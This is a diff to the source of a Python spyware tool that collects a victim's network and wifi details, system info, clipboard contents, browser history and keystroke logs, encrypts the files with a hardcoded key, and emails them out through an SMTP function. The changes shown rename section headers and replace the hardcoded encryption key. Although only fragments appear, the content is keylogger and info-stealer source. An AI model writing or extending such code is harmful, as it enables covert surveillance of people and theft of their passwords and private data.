@@ -130,7 +130,7 @@ def send_email(path):                               # Email sending function #
     smtp_handler(email_address, password, msg)
 
 
-#################################################### Main Function ##############################################################
+######################### Main Function: Network/Wifi Info, System Info, Clipbaord Data, Browser History #########################
 
 # Once main is initiated the program begins by creating a directory to store the data it will gather.
 def main():
@@ -200,7 +200,9 @@ def main():
     p1.join(timeout=300) ; p2.join(timeout=300) ; p3.join(timeout=300) ; p4.join(timeout=300)
     p1.terminate() ; p2.terminate() ; p3.terminate() ; p4.terminate()
 
-    # Encrypt files 
+
+######################################################## File Encryption ########################################################
+
     files = [ 'network_wifi.txt', 'system_info.txt', 'clipboard_info.txt', 'browser.txt', 'key_logs.txt' ]
 
     regex = re.compile(r'.+\.xml$')
@@ -214,7 +216,7 @@ def main():
     # from cryptography.fernet import Fernet
     # Fernet.generate_key()
     
-    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='
+    key = b'MujBTqtZ4QCQW_fmlMHVWBmTVRW8IGZSuxFctu_D3d0='
 
     for file in files:
         with open(file_path + file, 'rb') as plain_text:            # Opens the file in binary format for reading
